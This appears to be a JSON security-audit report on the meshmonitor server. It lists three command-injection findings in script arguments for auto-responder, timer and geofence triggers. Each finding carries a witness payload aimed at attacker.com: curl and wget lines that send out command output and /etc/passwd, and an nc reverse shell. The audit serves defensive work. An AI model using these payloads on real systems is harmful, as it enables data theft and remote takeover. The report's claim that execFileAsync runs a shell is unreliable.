{
  "vulnerabilities": [
    {
      "ID": "INJ-VULN-01",
      "vulnerability_type": "CommandInjection",
      "externally_exploitable": true,
      "source": "scriptArgs parameter in autoResponderTriggers array, /repos/meshmonitor/src/server/server.ts:4887",
      "combined_sources": "Single source: scriptArgs from POST /api/settings request body",
      "path": "POST /api/settings → server.ts:4887 (req.body) → server.ts:4993 (String conversion) → database.ts:7647 (storage) → meshtasticManager.ts:8114 (retrieval) → meshtasticManager.ts:8422 (replaceAcknowledgementTokens) → meshtasticManager.ts:8427 (parseScriptArgs) → meshtasticManager.ts:8433 (execFileAsync)",
      "sink_call": "/repos/meshmonitor/src/server/meshtasticManager.ts:8433, execFileAsync(interpreter, [resolvedPath, ...scriptArgsList], {timeout, env, maxBuffer})",
      "slot_type": "CMD-argument",
      "sanitization_observed": "NONE - Zero sanitization steps in entire data flow path",
      "concat_occurrences": "1. meshtasticManager.ts:9326-9399 (token replacement with .replace(), no encoding when urlEncode=false); 2. meshtasticManager.ts:9147 (character concatenation in parseScriptArgs: current += char); 3. meshtasticManager.ts:8433 (array spread: ...scriptArgsList into command execution)",
      "verdict": "vulnerable",
      "mismatch_reason": "User-controlled scriptArgs parameter flows to shell command execution with zero sanitization. The parseScriptArgs function only handles quote parsing without escaping shell metacharacters (semicolons, pipes, command substitution, etc.). When .sh scripts are executed via /bin/sh interpreter and use arguments unsafely (common pattern), command injection occurs.",
      "witness_payload": "; curl http://attacker.com/$(whoami) #",
      "confidence": "high",
      "notes": "Requires authentication and settings:write permission. Vulnerability triggered when auto-responder is activated by matching message. Affects all three script interpreters (sh, python, node) if target scripts use arguments unsafely. No post-sanitization concat because there is no sanitization at all."
    },
    {
      "ID": "INJ-VULN-02",
      "vulnerability_type": "CommandInjection",
      "externally_exploitable": true,
      "source": "scriptArgs parameter in timerTriggers array, /repos/meshmonitor/src/server/server.ts:4887",
      "combined_sources": "Single source: scriptArgs from POST /api/settings request body",
      "path": "POST /api/settings → server.ts:4887 (req.body) → server.ts:4993 (String conversion) → server.ts:5158 (store as JSON) → meshtasticManager.ts:1669 (parse from DB) → meshtasticManager.ts:1695 (executeTimerScript call) → meshtasticManager.ts:2205 (replaceAnnouncementTokens) → meshtasticManager.ts:2206 (parseScriptArgs) → meshtasticManager.ts:2211 (execFileAsync)",
      "sink_call": "/repos/meshmonitor/src/server/meshtasticManager.ts:2211, execFileAsync(interpreter, [resolvedPath, ...scriptArgsList], {timeout, env, maxBuffer})",
      "slot_type": "CMD-argument",
      "sanitization_observed": "NONE - Zero sanitization steps in entire data flow path",
      "concat_occurrences": "1. meshtasticManager.ts:9156-9311 (replaceAnnouncementTokens with .replace(), no sanitization); 2. meshtasticManager.ts:9147 (character concatenation in parseScriptArgs); 3. meshtasticManager.ts:2211 (array spread into command execution)",
      "verdict": "vulnerable",
      "mismatch_reason": "Identical vulnerability pattern to auto-responders. User-controlled scriptArgs flows to execFileAsync without any sanitization. Uses same vulnerable parseScriptArgs function that preserves all shell metacharacters. Timer triggers use replaceAnnouncementTokens (system tokens only) instead of replaceAcknowledgementTokens (message tokens), but neither function sanitizes shell metacharacters.",
      "witness_payload": "--flag1 value1; wget http://attacker.com/exfil?data=$(cat /etc/passwd) #",
      "confidence": "high",
      "notes": "Requires authentication and settings:write permission. Vulnerability triggered when cron schedule fires (time-based, not message-based). Shares same parseScriptArgs and execFileAsync code path as auto-responders. Independently exploitable attack surface."
    },
    {
      "ID": "INJ-VULN-03",
      "vulnerability_type": "CommandInjection",
      "externally_exploitable": true,
      "source": "scriptArgs parameter in geofenceTriggers array, /repos/meshmonitor/src/server/server.ts:4887",
      "combined_sources": "Single source: scriptArgs from POST /api/settings request body",
      "path": "POST /api/settings → server.ts:4887 (req.body) → server.ts:4993 (String conversion) → database (storage) → meshtasticManager.ts:1790 (load from DB) → meshtasticManager.ts:1819/1827 (executeGeofenceTrigger) → meshtasticManager.ts:1869 (executeGeofenceScript) → meshtasticManager.ts:1960 (replaceGeofenceTokens) → meshtasticManager.ts:1963 (parseScriptArgs) → meshtasticManager.ts:1967 (execFileAsync)",
      "sink_call": "/repos/meshmonitor/src/server/meshtasticManager.ts:1967, execFileAsync(interpreter, [resolvedPath, ...scriptArgsList], {timeout, env, maxBuffer})",
      "slot_type": "CMD-argument",
      "sanitization_observed": "NONE - Zero sanitization steps in entire data flow path",
      "concat_occurrences": "1. meshtasticManager.ts:2057-2086 (replaceGeofenceTokens calls replaceAnnouncementTokens then adds geofence-specific tokens, all via .replace() without sanitization); 2. meshtasticManager.ts:9147 (character concatenation in parseScriptArgs); 3. meshtasticManager.ts:1967 (array spread into command execution)",
      "verdict": "vulnerable",
      "mismatch_reason": "Identical vulnerability pattern to auto-responders and timers. User-controlled scriptArgs flows to execFileAsync without sanitization. Uses same vulnerable parseScriptArgs function. replaceGeofenceTokens adds geofence-specific tokens (NODE_LAT, NODE_LON, GEOFENCE_NAME, EVENT, DISTANCE_TO_CENTER) but performs no shell escaping on any token values or the scriptArgs string itself.",
      "witness_payload": "; nc attacker.com 4444 -e /bin/sh #",
      "confidence": "high",
      "notes": "Requires authentication and settings:write permission. Vulnerability triggered when node enters/exits defined geographic boundary (position-based trigger). Shares same vulnerable code path (parseScriptArgs and execFileAsync) as other trigger types. Independently exploitable attack surface with different trigger mechanism."
    }
  ]
}
